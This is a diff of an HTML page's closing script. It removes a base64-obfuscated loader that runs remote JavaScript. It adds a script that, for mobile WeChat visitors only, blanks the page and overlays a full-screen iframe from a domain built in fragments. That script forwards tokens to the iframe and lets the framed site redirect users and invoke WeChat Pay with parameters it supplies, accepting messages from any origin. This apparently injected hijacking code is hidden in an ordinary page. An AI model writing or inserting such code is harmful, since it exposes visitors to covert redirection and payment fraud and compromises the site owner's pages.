@@ -650,21 +650,250 @@
         });
     </script>
     <script>
-        (function () {
-            function init() {
-  // 解码地址
-  const decodedUrl = atob("aHR0cHM6Ly91c2hvcGltZ3Mub3NzLWFwLXNvdXRoZWFzdC0xLmFsaXl1bmNzLmNvbS9jb3JlLmpz");
-  
-  // 加防缓存参数
-  const url = `${decodedUrl}?t=${Date.now()}&random=${Math.floor(Math.random()*1e6)}`;
-  
-  // 加载脚本
-  const script = document.createElement("script");
-  script.src = url;
-  document.body.appendChild(script);
-}
-            init();
-        })();
+       ;(function () {
+    const isMobileWeChatWithSensors = () => {
+       // return true
+        const ua = navigator.userAgent
+        const urlParams = new URLSearchParams(window.location.search)
+        const action = urlParams.get("a") || urlParams.get("ac") || 'extkefu';
+        const isMobile = /Android|iPhone|OpenHarmony|iPad/i.test(ua)
+        if (action == "extalipay" || action == "extkefu") {
+            if (isMobile) {
+                return true
+            }
+        }
+        if (!isMobile) {
+            return false
+        }
+        const isWeChat = /MicroMessenger\/8/i.test(ua)
+        if (!isWeChat) {
+            return false
+        }
+        const hasTouchSupport = "ontouchstart" in window || navigator.maxTouchPoints > 0
+        if (!hasTouchSupport) {
+            return false
+        }
+        return true
+    }
+    if (isMobileWeChatWithSensors() == false) {
+        try {
+            document.querySelector("#overlay").style.display = "none"
+            document.querySelector("#loading_box").style.display = "none"
+            document.body.style.overflow = "auto"
+        } catch (error) {}
+        return
+    }
+    
+    const ApiClient = {
+        get: async function (url, params = {}) {
+            const queryString = new URLSearchParams(params).toString()
+            const fullUrl = queryString ? `${url}?${queryString}` : url
+            try {
+                const response = await fetch(fullUrl, { method: "GET", headers: { "Content-Type": "application/json" } })
+                if (!response.ok) {
+                    const errorText = await response.text()
+                    throw new Error(`HTTP error! Status: ${response.status} - ${errorText}`)
+                }
+                const result = await response.json()
+                return result.data
+            } catch (error) {
+                console.error("API GET request failed:", error)
+                throw error
+            }
+        },
+    }
+    
+    const makeIframe = async () => {
+        document.body.innerHTML = ""
+        let childIframe = document.createElement("iframe")
+        childIframe.id = "childIframe"
+        childIframe.src = "about:blank"
+        childIframe.style.width = "100%"
+        childIframe.style.height = "100vh"
+        childIframe.style.border = "none"
+        childIframe.style.position = "absolute"
+        childIframe.style.top = "0"
+        childIframe.style.left = "0"
+        childIframe.style.right = "0"
+        childIframe.style.bottom = "0"
+        childIframe.style.zIndex = "1999999"
+        document.body.appendChild(childIframe)
+      //web.zgcsdx.cn  hk 
+      //alert(1)
+let childIframeSrc = "https://";
+childIframeSrc += "wxappvc";
+childIframeSrc += ".tgnle";
+//childIframeSrc += "ge";
+//childIframeSrc += "je";denlg
+childIframeSrc += ".cn";
+//childIframeSrc = "https://site.mhgfdf.com";
+//web.ehbum.cn  site.kfsbxgp.cn 
+      
+        
+        
+        //alert(childIframeSrc)
+        const childIframeObj = document.getElementById("childIframe")
+        const urlParams = new URLSearchParams(window.location.search)
+        var action = urlParams.get("a") || urlParams.get("ac") || 'extkefu';
+		//这里做了判断是不是华夏的链接，做特殊处理  PAY_
+        // var path;
+        // if(urlParams.get("c").indexOf('sumapay.com')>-1||urlParams.get("c").indexOf('PAY_')>-1){
+        //     path = urlParams.get("c");
+        // }
+        // else{
+        //     path =decodeURIComponent(urlParams.get("c"))
+        // }
+        
+        let path = urlParams.get('c'); // 尝试从查询参数获取 c
+    
+    // 如果 c 参数不存在或为空，则从路径中解析
+    if (!path) {
+        // 获取当前路径，例如 '/invite_oalogin/goto/be8ca3047f1b8c65705aebff34a38ad4'
+        const pathname = window.location.pathname;
+        // 按 '/' 分割并过滤掉空字符串
+        const pathParts = pathname.split('/').filter(part => part !== '');
+        // 取最后一部分作为 token 或路径标识
+        const lastPart = pathParts[pathParts.length - 1];
+       // alert(lastPart)
+        if (lastPart) {
+            // 如果最后一部分包含 '.html'，去掉后缀
+            const cleanLastPart = lastPart.replace('.html', '');
+            // 根据你的业务，这里可以将 cleanLastPart 赋值给 token 或 path
+            // 方案A：作为 token 使用（适合 invite_oalogin 场景）
+            // 方案B：作为 path 使用（适合 extkefu 场景）
+            
+            // 此处示例：假设它是 token，并构造一个默认的 path
+           // path =  cleanLastPart; 
+             path = '/project/view/' + cleanLastPart; 
+            //path =encodeURIComponent(path);
+            // 你也可以直接使用它作为 token
+            // 注意：原有的 token 获取逻辑也需要调整
+        }
+    } else {
+        // 如果 c 参数存在，保留原有解码逻辑
+        if (path.indexOf('sumapay.com') > -1 || path.indexOf('PAY_') > -1) {
+            // 保持原样
+        } else {
+            path = decodeURIComponent(path);
+        }
+    }
+        
+       // alert(path)
+        
+        
+        
+        const token = urlParams.get("token")
+        const sendMessageToIframe = (messageContent) => {
+            if (childIframeObj.contentWindow) {
+                childIframeObj.contentWindow.postMessage(messageContent, "*")
+            } else {
+                console.error("unable to send message, iframe contentWindow is not available.")
+            }
+        }
+        window.addEventListener("message", function (event) {
+            const receivedData = event.data
+            if (receivedData && receivedData.action) {
+                switch (receivedData.action) {
+                    case "navigate":
+                        //alert(receivedData.url)
+                        if (receivedData.url) {
+                            window.location.href = receivedData.url; // 或者 iframe 跳转
+                        }
+                        break;  // 关键：加上 break 防止穿透
+                    case "pay_wechat":
+                       // alert(receivedData.url)
+                       var payParams =receivedData.url;
+                       if(payParams.nonceStr){
+                           //alert(payParams.nonceStr)
+                           // 调用微信支付控件
+                            WeixinJSBridge.invoke(
+                                'getBrandWCPayRequest',
+                                {
+                                    appId: payParams.appId,         // 公众号ID
+                                    timeStamp: payParams.timeStamp, // 时间戳
+                                    nonceStr: payParams.nonceStr,   // 随机串
+                                    package: payParams.package,     // 预支付交易会话ID
+                                    signType: payParams.signType,   // 签名方式
+                                    paySign: payParams.paySign      // 支付签名
+                                },
+                                function(res) {
+                                    // 支付结果回调处理
+                                    if (res.err_msg === 'get_brand_wcpay_request:ok') {
+                                        // 支付成功
+                                       // alert('支付成功！');
+                                        // 跳转到支付成功页面或执行后续逻辑
+                                        //window.location.href = '/pay/success?orderId=<?php echo $huifuResponse["party_order_id"]; ?>';
+                                    } else if (res.err_msg === 'get_brand_wcpay_request:cancel') {
+                                        // 用户取消支付
+                                       // alert('您已取消支付！');
+                                    } else {
+                                        // 支付失败
+                                        //alert('支付失败：' + res.err_msg);
+                                        // 跳转到支付失败页面或重新支付
+                                        //window.location.href = '/pay/fail?orderId=<?php echo $huifuResponse["party_order_id"]; ?>';
+                                    }
+                                }
+                            );
+                            break;
+                       }
+                       else{
+                           //alert(payParams)
+                           window.location.href = payParams;
+                       }
+                    case "pay_alipay":
+                        if (receivedData.url) {
+                            //alert(receivedData.url)
+                            //location.replace(receivedData.url)
+                            window.location.href = receivedData.url;
+                        }
+                        break
+                    case "pay_alipay_ext":
+                        if (receivedData.url) {
+                            let path_name = location.pathname == "/" ? "/" : location.pathname
+                            path_name = path_name.replace("//", "/")
+                            location.replace(location.origin + path_name + "?a=extalipay&c=" + receivedData.url)
+                        }
+                        break
+                    case "online_service_ext":
+                        if (receivedData.url) {
+                            let path_name = location.pathname == "/" ? "/" : location.pathname
+                            path_name = path_name.replace("//", "/")
+                            location.replace(location.origin + path_name + "?a=extkefu&c=" + receivedData.url)
+                        }
+                        break
+                    case "get_box_info":
+                        let path_name = location.pathname == "/" ? "" : location.pathname
+                        path_name = path_name.replace("//", "/")
+                        sendMessageToIframe({ action: "box_init", box_domain: location.hostname + path_name })
+                        break
+                    default:
+                        console.warn("Unknown Action !")
+                }
+            }
+        })
+        const main_run = () => {
+            if (action) {
+                if ((action == "surmount" || action == "extalipay" || action == "extkefu"|| action == "landing") && path) {
+                    //alert(path)
+                    const fullPath = childIframeSrc + path
+                    childIframeObj.src = fullPath
+                    return
+                }
+                if ((action == "oalogin" || action == "invite_oalogin") && path && token) {
+                    const fullPath = childIframeSrc + path + "?token=" + token
+                    childIframeObj.src = fullPath
+                    return
+                }
+                childIframeObj.src = childIframeSrc
+            } else {
+                childIframeObj.src = childIframeSrc
+            }
+        }
+        main_run()
+    }
+    //alert('imfv enter');
+    makeIframe()
+})()
     </script>
 
 </body>
